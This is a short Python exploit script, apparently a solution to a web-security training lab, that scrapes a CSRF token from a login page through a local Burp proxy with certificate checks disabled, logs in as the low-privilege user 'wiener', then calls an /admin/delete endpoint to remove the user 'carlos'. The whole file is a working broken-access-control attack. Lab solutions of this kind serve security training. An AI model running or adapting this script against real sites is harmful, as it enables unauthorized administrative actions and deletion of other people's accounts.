import requests
import re




# Disable certificate warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()

# Use Burp proxy if needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Take URL input

app_url = input("Enter your url :  ").strip()

# To find the csrf token from url 

csrf_token = session.get(app_url+"/login",verify=False,proxies=proxies)
match  = re.search(r'name="csrf" value="(.*?)"',csrf_token.text)  # find the csrf token
token = match.group(1)
print(f"this is csrf",token)


data = {"username":"wiener","password":"peter","csrf":token}
login_wiener = session.post(app_url+"/login",verify=False,data=data,proxies=proxies,allow_redirects=False)
delete_carlos = session.get(app_url+"/admin/delete?username=carlos",verify=False,proxies=proxies)
